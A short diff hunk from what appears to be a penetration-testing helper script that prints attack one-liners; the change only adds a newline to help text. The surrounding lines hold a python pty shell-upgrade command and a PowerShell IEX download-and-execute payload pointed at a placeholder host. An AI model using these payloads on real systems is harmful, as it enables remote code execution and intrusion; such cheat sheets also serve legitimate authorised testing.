@@ -263,7 +263,7 @@ PL3=$(echo "python3 -c 'import pty; pty.spawn(~/bin/bash~)'" | sed s/\~/\"/g)
 printf "$PL3"
 printf "\n\n		loads up line for python shell upgrade
 		usage:		./lineplease.sh -pl2\n
-		when prompted:  y to copy to clipboard (requires xsel)/any other key to exit
+		when prompted:  y to copy to clipboard (requires xsel)/any other key to exit\n
 -psd		"
 PSD=$(echo "powershell ~IEX(New-Object Net.WebClient).downloadString('http://[ip]:[port]/[filename]')~" | sed s/\~/\"/g)
 printf "$PSD"
